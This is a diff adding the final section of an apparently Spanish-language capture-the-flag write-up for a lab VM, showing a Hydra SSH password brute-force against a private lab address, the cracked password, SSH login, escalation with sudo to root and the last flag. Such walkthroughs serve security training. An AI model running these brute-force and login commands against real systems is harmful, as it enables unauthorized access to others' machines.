@@ -302,7 +302,38 @@ Crunch will now generate the following amount of data: 2080 bytes
 0 PB
 Crunch will now generate the following number of lines: 260
 ```
-Genere 4 listas y las uni en un solo archivo txt para luego utilizar hydra para hacer el ataque de fuerza bruta.
+Genere 4 listas y las uni en un solo archivo txt para luego utilizar **hydra** para hacer el ataque de fuerza bruta.
+
+```console
+root@atkvm:~# hydra -l RickSanchez -P pass.txt 192.168.56.106 -s 22222 ssh -t 4
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-03-27 15:24:32
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 260 login tries (l:1/p:260), ~65 tries per task
+[DATA] attacking ssh://192.168.56.106:22222/
+[22222][ssh] host: 192.168.56.106   login: RickSanchez   password: P7Curtains
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-03-27 15:29:48
+```
+Listo ya conseguimos el password de Rick: **P7Curtains**
+Por lo tanto vamos a ingresar por ssh, obtener sudo e ingresar a la carpeta **/root** para obtener la ultima bandera:
+```console
+root@atkvm:~# ssh RickSanchez@192.168.56.106 -p 22222
+RickSanchez@192.168.56.106's password: 
+Last failed login: Thu Mar 28 06:29:46 AEDT 2019 from 192.168.56.1 on ssh:notty
+There were 283 failed login attempts since the last successful login.
+Last login: Wed Mar 27 14:08:04 2019 from 192.168.56.1
+[RickSanchez@localhost ~]$ sudo su
+[sudo] password for RickSanchez: 
+[root@localhost RickSanchez]# cd /root
+[root@localhost ~]# ls
+anaconda-ks.cfg  FLAG.txt
+[root@localhost ~]# more FLAG.txt 
+FLAG: {Ionic Defibrillator} - 30 points
+```
+Listo ya ahi podemos ver la ultima bandera
+
+#### FLAG: {Ionic Defibrillator} - 30 points
 
 
 
